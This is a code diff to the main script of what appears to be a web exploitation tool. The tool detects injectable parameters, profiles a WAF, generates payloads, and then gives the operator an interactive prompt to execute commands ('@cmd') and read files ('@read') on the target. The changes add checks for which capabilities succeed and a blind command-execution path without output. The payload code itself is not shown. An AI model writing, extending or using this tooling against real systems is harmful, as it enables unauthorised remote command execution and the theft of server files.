@@ -65,7 +65,7 @@ if __name__ == "__main__":
         params = utils.parseParams(params)
     vulnParam = detectParams(urlTarget, method, params, cookie, isJsonBody)
     if vulnParam:
-        isContinue = input("Do you want to continue? (y/n): ").lower()
+        isContinue = input("[*] Do you want to continue? (y/n): ").lower()
         if isContinue.lower() != "y":
             exit()
     requestHandler = RequestHandler(
@@ -74,16 +74,32 @@ if __name__ == "__main__":
     genwaf = genWAF(requestHandler)
     waf = genwaf.generateWAF()
     genPayload = GenPayload(requestHandler, waf)
+
     command = ""
+    canExec = genPayload.canExec()
+    canRead = genPayload.canRead()
+    hasOutput = genPayload.hasOutput()
     while command != "exit":
-        print("Type '@cmd [command]' to execute command")
-        print("Type '@read' [filename] to read file")
-        print("Type '@gen' to generate payload")
+        if canExec:
+            if not hasOutput:
+                print(
+                    "Type '@cmd [command]' to execute command (but there is no output)"
+                )
+            else:
+                print("Type '@cmd [command]' to execute command")
+        if canRead:
+            print("Type '@read' [filename] to read file")
+        if not canExec and not canRead:
+            print("Sorry but this tool can not do anything :(")
+            exit()
         print("Type 'exit' to exit")
         command = input(">> ")
         if command.startswith("@cmd"):
             command = command.replace("@cmd ", "")
-            print(genPayload.exec(command))
-        elif command.startswith("@read"):
+            if genPayload.hasOutput():
+                print(genPayload.exec(command))
+            else:
+                print(genPayload.execPayloadNoOutput(command))
+        elif command.startswith("@read") and genPayload.canRead():
             filename = command.replace("@read ", "")
             print(genPayload.read(filename))
